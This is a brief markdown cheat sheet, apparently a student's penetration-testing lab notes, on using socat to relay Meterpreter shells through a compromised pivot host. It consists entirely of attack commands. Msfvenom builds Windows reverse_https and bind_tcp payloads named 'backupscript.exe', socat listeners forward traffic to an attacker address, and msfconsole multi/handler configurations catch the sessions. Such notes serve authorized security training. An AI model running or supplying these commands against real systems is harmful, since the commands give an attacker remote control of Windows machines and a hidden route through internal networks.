# Socat

## Socat Redirection with a Reverse Shell

1) Starting Socat Listener
On Target Host :
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

2) Creating the Windows Payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

3) Configuring & Starting the multi/handler
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run

4) Establishing the Meterpreter Session
meterpreter > getuid

## Socat Redirection with a Bind Shell

1) Creating the Windows Payload
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

2) Starting Socat Bind Shell Listener
On TARGET host :
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

3) Configuring & Starting the Bind multi/handler
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run

4) Establishing Meterpreter Session
meterpreter > getuid
